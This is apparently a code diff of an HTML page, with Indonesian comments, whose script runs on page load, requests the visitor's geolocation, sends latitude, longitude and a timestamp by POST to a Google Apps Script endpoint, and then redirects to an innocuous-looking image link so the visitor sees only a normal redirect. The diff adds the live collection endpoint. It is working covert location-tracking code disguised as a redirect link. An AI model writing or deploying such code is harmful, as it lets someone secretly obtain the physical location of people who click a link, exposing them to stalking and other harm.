@@ -5,36 +5,39 @@
   <script>
     const targetURL = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.bapelright.biz%2Fkaos-sekolah-keren%2F&psig=AOvVaw12Y-mzmjlt7_FCdRf_DTxv&ust=1748073317359000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCNiMrNuOuY0DFQAAAAAdAAAAABAE";
 
-    function sendAndRedirect(position) {
-      fetch('https://script.google.com/macros/s/AKFY.../exec', {
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Kirim ke Google Apps Script kamu
+      fetch('https://script.google.com/macros/s/AKfycbzZXb8fV8X5GJIDGbv3AfDpGsDzZFjj5lZ8mDpCFWn517eBoC1_wM3m4MTjjcw0LUxC/exec', {
         method: 'POST',
         body: JSON.stringify({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
+          latitude: latitude,
+          longitude: longitude,
           timestamp: new Date().toISOString()
         }),
         headers: {
           'Content-Type': 'application/json'
         }
       }).finally(() => {
-        // Setelah selesai, langsung redirect
+        // Setelah dikirim, redirect ke halaman target
         window.location.href = targetURL;
       });
     }
 
-    function init() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendAndRedirect, () => {
-          // Jika tidak diizinkan, tetap redirect
-          window.location.href = targetURL;
-        });
-      } else {
-        // Jika browser tidak mendukung geolocation
-        window.location.href = targetURL;
-      }
+    function handleError() {
+      // Jika gagal ambil lokasi, tetap redirect
+      window.location.href = targetURL;
     }
 
-    window.onload = init;
+    window.onload = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        handleError();
+      }
+    }
   </script>
 </head>
 <body>
